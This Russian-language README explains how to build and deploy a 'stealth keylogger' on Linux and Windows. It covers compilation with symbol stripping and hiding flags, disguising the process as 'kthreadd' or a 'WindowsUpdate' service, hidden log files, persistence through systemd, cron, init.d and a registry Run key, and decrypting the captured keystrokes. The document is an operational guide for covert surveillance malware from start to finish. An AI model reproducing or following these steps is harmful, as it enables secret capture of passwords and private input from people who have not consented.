# 🚀 Полное развертывание проекта

## 📋 Содержание
1. [Подготовка окружения](#подготовка-окружения)
2. [Сборка проекта](#сборка-проекта)
3. [Развертывание Linux](#развертывание-linux)
4. [Развертывание Windows](#развертывание-windows)
5. [Проверка работы](#проверка-работы)
6. [Удаление](#удаление)

---

## 🔧 Подготовка окружения

### Linux (для сборки обеих версий)

```bash
# Обновление пакетов
sudo apt-get update

# Установка зависимостей
sudo apt-get install -y \
    build-essential \
    g++ \
    gcc \
    mingw-w64 \
    xdotool \
    upx-ucl \
    git

# Проверка установки
g++ --version
x86_64-w64-mingw32-g++ --version
xdotool --version
```

### Windows (только для Windows версии)

```cmd
# Установка MinGW-w64
# Скачать с: https://www.mingw-w64.org/downloads/

# Или через MSYS2:
pacman -S mingw-w64-x86_64-gcc
pacman -S mingw-w64-x86_64-toolchain
```

---

## 🏗️ Сборка проекта

### Клонирование репозитория

```bash
# Клонировать репозиторий
git clone https://github.com/yourusername/stealth-keyloggers.git
cd stealth-keyloggers

# Или если уже есть локально
cd stealth-keyloggers
git pull origin main
```

### Сборка Linux версии

```bash
# Сделать скрипт исполняемым
chmod +x build/build_linux.sh

# Сборка
./build/build_linux.sh

# Результат:
# - stealth_keylogger (180K) - основной кейлоггер
# - decrypt_logs (9.6K) - утилита расшифровки
# - install_linux.sh - скрипт установки
# - uninstall_linux.sh - скрипт удаления
```

### Сборка Windows версии

```bash
# Сборка через MinGW (из Linux)
chmod +x build/build_windows.bat

# Или вручную:
x86_64-w64-mingw32-g++ -O3 -fno-stack-protector -fno-ident -s -DNDEBUG \
  -mwindows -ffunction-sections -fdata-sections -Wl,--gc-sections \
  -fvisibility=hidden -fvisibility-inlines-hidden -Wl,--strip-all \
  -o stealth_keylogger.exe src/windows_keylogger.cpp \
  -luser32 -lkernel32 -ladvapi32 -lntdll -lwtsapi32 -liphlpapi -lpsapi

x86_64-w64-mingw32-g++ -O2 -s -o decrypt_logs.exe src/decrypt_logs.cpp

# Результат:
# - stealth_keylogger.exe (66K)
# - decrypt_logs.exe (17K)
# - install_service.bat (создается автоматически)
```

### Проверка сборки

```bash
# Linux
file stealth_keylogger decrypt_logs
./stealth_keylogger --help 2>&1 | head -1  # Проверка запуска

# Windows
file stealth_keylogger.exe decrypt_logs.exe
# На Windows: запустить и проверить что нет ошибок
```

---

## 🐧 Развертывание Linux

### Вариант 1: Тестовый запуск (без установки)

```bash
# Запуск от root (требуется для доступа к /dev/input/*)
sudo ./stealth_keylogger

# Проверка работы
ps aux | grep kthreadd
ls -la /tmp/.sys_log_*

# Остановка
sudo pkill -f stealth_keylogger
```

### Вариант 2: Установка как системный сервис

```bash
# Установка
sudo ./install_linux.sh

# Что делает скрипт:
# 1. Копирует бинарник в /usr/bin/ksysmond
# 2. Создает systemd service /etc/systemd/system/ksysmon.service
# 3. Добавляет в crontab (@reboot)
# 4. Создает init.d скрипт (для старых систем)
# 5. Запускает сервис

# Проверка статуса
sudo systemctl status ksysmon.service

# Просмотр логов сервиса
sudo journalctl -u ksysmon.service -f

# Перезапуск
sudo systemctl restart ksysmon.service
```

### Расположение файлов после установки

```
/usr/bin/ksysmond                    # Основной бинарник
/etc/systemd/system/ksysmon.service  # Systemd unit
/etc/init.d/ksysmon                  # Init.d скрипт (старые системы)
/tmp/.sys_log_<PID>                  # Логи (основное место)
/var/tmp/.sys_log_<PID>             # Логи (альтернатива)
/dev/shm/.sys_log_<PID>             # Логи (shared memory)
```

### Персистентность

Кейлоггер автоматически запускается при:
- Загрузке системы (systemd)
- Перезагрузке (crontab @reboot)
- Старые системы (init.d)

---

## 🪟 Развертывание Windows

### Вариант 1: Тестовый запуск

```cmd
# Запуск от имени администратора
stealth_keylogger.exe

# Логи будут в:
# %TEMP%\~<PID>.tmp
# или
# %LOCALAPPDATA%\Microsoft\Windows\<PID>.dat

# Остановка
taskkill /F /IM stealth_keylogger.exe
```

### Вариант 2: Установка как Windows Service

```cmd
# Запуск install_service.bat от имени администратора
install_service.bat

# Что делает скрипт:
# 1. Останавливает существующий сервис (если есть)
# 2. Копирует в %SYSTEMROOT%\system32\svchost_keylogger.exe
# 3. Создает сервис "WindowsUpdate"
# 4. Настраивает автозапуск
# 5. Запускает сервис

# Проверка статуса
sc query WindowsUpdate

# Просмотр логов (Event Viewer)
eventvwr.msc
# Смотреть: Windows Logs → Application
```

### Расположение файлов после установки

```
%SYSTEMROOT%\system32\svchost_keylogger.exe  # Основной бинарник
%TEMP%\~<PID>.tmp                            # Логи (основное место)
%LOCALAPPDATA%\Microsoft\Windows\<PID>.dat  # Логи (альтернатива)
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run  # Автозагрузка (резерв)
```

### Персистентность

Кейлоггер автоматически запускается при:
- Загрузке системы (Windows Service)
- Входе пользователя (Registry Run key - резерв)

---

## ✅ Проверка работы

### Linux

```bash
# 1. Проверка процесса
ps aux | grep -E "(kthreadd|ksysmond)"
# Должен показать процесс с именем "kthreadd"

# 2. Проверка сервиса
sudo systemctl status ksysmon.service
# Должен быть "active (running)"

# 3. Проверка логов
ls -la /tmp/.sys_log_*
# Должен быть файл с текущим PID

# 4. Тест записи
# Нажми несколько клавиш, затем:
./decrypt_logs /tmp/.sys_log_<PID>
# Должны появиться записанные символы

# 5. Проверка открытых файлов
sudo lsof -p $(pgrep kthreadd) | grep /dev/input
# Должен показать открытые input устройства
```

### Windows

```cmd
# 1. Проверка процесса
tasklist | findstr /i "windowsupdate"
# Или через Process Explorer

# 2. Проверка сервиса
sc query WindowsUpdate
# Должен быть "RUNNING"

# 3. Проверка логов
dir /s /a %TEMP%\~*.tmp
dir /s /a %LOCALAPPDATA%\Microsoft\Windows\*.dat

# 4. Тест записи
# Нажми несколько клавиш, затем:
decrypt_logs.exe "C:\Users\%USERNAME%\AppData\Local\Temp\~<PID>.tmp"
# Должны появиться записанные символы

# 5. Проверка хуков (Process Explorer)
# Запусти Process Explorer от админа
# Найди процесс, проверь "Hooks" tab
```

---

## 🗑️ Удаление

### Linux

```bash
# Автоматическое удаление
sudo ./uninstall_linux.sh

# Или вручную:
sudo systemctl stop ksysmon.service
sudo systemctl disable ksysmon.service
sudo rm /etc/systemd/system/ksysmon.service
sudo rm /usr/bin/ksysmond
sudo rm /etc/init.d/ksysmon
sudo crontab -l | grep -v ksysmond | crontab -
sudo pkill -f ksysmond

# Удаление логов
sudo rm -f /tmp/.sys_log_* /var/tmp/.sys_log_* /dev/shm/.sys_log_*
```

### Windows

```cmd
# Остановка и удаление сервиса
net stop WindowsUpdate
sc delete WindowsUpdate

# Удаление файла
del "%SYSTEMROOT%\system32\svchost_keylogger.exe"

# Удаление из автозагрузки
reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v WindowsSecurityUpdate /f

# Удаление логов
del /s /q "%TEMP%\~*.tmp"
del /s /q "%LOCALAPPDATA%\Microsoft\Windows\*.dat"
```

---

## 🔍 Мониторинг и обслуживание

### Регулярные задачи

1. **Ротация логов**: Удаляй старые логи (раз в неделю)
2. **Проверка работы**: Убедись что сервис запущен
3. **Мониторинг размера**: Следи за размером логов
4. **Обновление**: Перекомпилируй при необходимости

### Скрипт автоматической ротации (Linux)

```bash
#!/bin/bash
# rotate_logs.sh

# Удалить логи старше 7 дней
find /tmp /var/tmp /dev/shm -name ".sys_log_*" -mtime +7 -delete

# Добавить в crontab:
# 0 0 * * 0 /path/to/rotate_logs.sh
```

---

## 🚨 Устранение проблем

### Linux: "Permission denied" на /dev/input

```bash
# Решение: запускай от root
sudo ./stealth_keylogger

# Или измени права (не рекомендуется для безопасности)
sudo chmod 644 /dev/input/event*
```

### Linux: Сервис не запускается

```bash
# Проверь логи
sudo journalctl -u ksysmon.service -n 50

# Проверь права на бинарник
ls -la /usr/bin/ksysmond
sudo chmod +x /usr/bin/ksysmond

# Перезагрузи systemd
sudo systemctl daemon-reload
```

### Windows: Сервис не запускается

```cmd
# Проверь Event Viewer
eventvwr.msc

# Проверь права
# Убедись что запускаешь install_service.bat от админа

# Проверь что файл существует
dir "%SYSTEMROOT%\system32\svchost_keylogger.exe"
```

### Логи не расшифровываются

```bash
# Проверь что файл не пустой
wc -l /tmp/.sys_log_<PID>

# Проверь что используешь правильный decrypt_logs
./decrypt_logs --help 2>&1

# Попробуй другой файл
ls -la /tmp/.sys_log_*
```

---

## 📊 Метрики развертывания

### Время развертывания
- **Linux**: ~2 минуты (компиляция + установка)
- **Windows**: ~3 минуты (компиляция + установка сервиса)

### Размер установки
- **Linux**: ~180KB (бинарник) + ~1KB (сервис файлы)
- **Windows**: ~66KB (бинарник) + реестр

### Ресурсы
- **CPU**: <1% (idle), <2% (active)
- **RAM**: <5MB (Linux), <10MB (Windows)
- **Disk**: ~1MB/день при активном использовании

---

**Готово к развертыванию! 🚀**

